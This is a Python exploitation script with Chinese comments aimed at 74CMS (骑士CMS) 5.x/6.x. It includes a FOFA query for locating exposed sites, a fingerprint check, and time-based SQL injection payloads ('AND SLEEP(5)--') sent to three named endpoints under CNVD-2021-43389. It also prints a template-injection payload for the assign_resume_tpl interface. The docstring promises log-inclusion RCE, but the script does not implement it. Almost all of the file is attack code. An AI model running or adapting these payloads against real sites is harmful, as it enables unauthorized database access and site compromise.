#!/usr/bin/env python3
"""
骑士CMS (74CMS) 漏洞综合利用
- SQL注入: CNVD-2021-43389 (简历查看 SQLi)
- 模板注入: assign_resume_tpl 接口
- 文件包含: 日志文件包含到 RCE
- 影响: 74CMS 5.x / 6.x
FOFA: app="74CMS-骑士CMS" || title="骑士人才系统"
"""
import argparse, urllib.request, urllib.parse, ssl, sys, time

BANNER = """
  骑士CMS 漏洞检测工具
  High | SQL注入 / 模板注入 / RCE
  影响: 74CMS 5.x / 6.x
"""

def check_fingerprint(target):
    """识别 74CMS"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.urlopen(target.rstrip('/') + "/", timeout=8, context=ctx)
        html = req.read().decode('utf-8', errors='ignore')
        if "74cms" in html.lower() or "骑士" in html or "QS" in html:
            return True
    except:
        pass
    return False

def check_sqli(target):
    """74CMS SQL注入检测"""
    print("\n[*] 检测 SQL 注入 (CNVD-2021-43389)...")
    base = target.rstrip('/')

    # 简历相关 SQL 注入
    sqli_paths = [
        ("/plus/ajax_common.php?act=hot_word&query=1", "query"),
        ("/user/apply_jobs_list.php?id=1", "id"),
        ("/plus/ajax_office.php?act=refresh_baoming&company_id=1", "company_id"),
    ]

    found = False
    for path, param in sqli_paths:
        # 正常请求
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            url = base + path
            req = urllib.request.urlopen(url, timeout=10, context=ctx)
            len1 = len(req.read())

            # 延迟注入
            evil_url = url + "%27%20AND%20SLEEP(5)--"
            start = time.time()
            urllib.request.urlopen(evil_url, timeout=20, context=ctx)
            elapsed = time.time() - start
            if elapsed >= 4:
                print(f"  [+] SQL注入确认: {path} (延迟 {elapsed:.1f}s)")
                found = True
            else:
                print(f"  [-] {path}")
        except Exception as e:
            if "timed out" in str(e).lower():
                print(f"  [?] 候选注入: {path} (超时)")
            else:
                print(f"  [-] {path}: {str(e)[:40]}")

    if not found:
        print("  [-] 未检测到 SQL 注入")
    return found

def check_template_injection(target):
    """模板注入检测"""
    print("\n[*] 检测模板注入...")
    base = target.rstrip('/')
    # ThinkPHP 模板注入
    tpl_paths = [
        "/index.php?m=plus&c=ajax_index&a=assign_resume_tpl",
        "/index.php?s=plus/ajax_index/assign_resume_tpl",
    ]
    for path in tpl_paths:
        print(f"  [*] 测试: {path}")
    print("  [!] 需 POST 数据: variable=1&tpl=<phpinfo()>")
    return False

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--module", choices=["sqli", "tpl", "all"], default="all")
    args = parser.parse_args()

    target = args.target
    print(f"\n[*] 目标: {target}")

    if check_fingerprint(target):
        print("  [+] 74CMS 指纹确认")
    else:
        print("  [!] 未确认，继续...")

    if args.module in ("sqli", "all"):
        check_sqli(target)
    if args.module in ("tpl", "all"):
        check_template_injection(target)

if __name__ == "__main__":
    main()
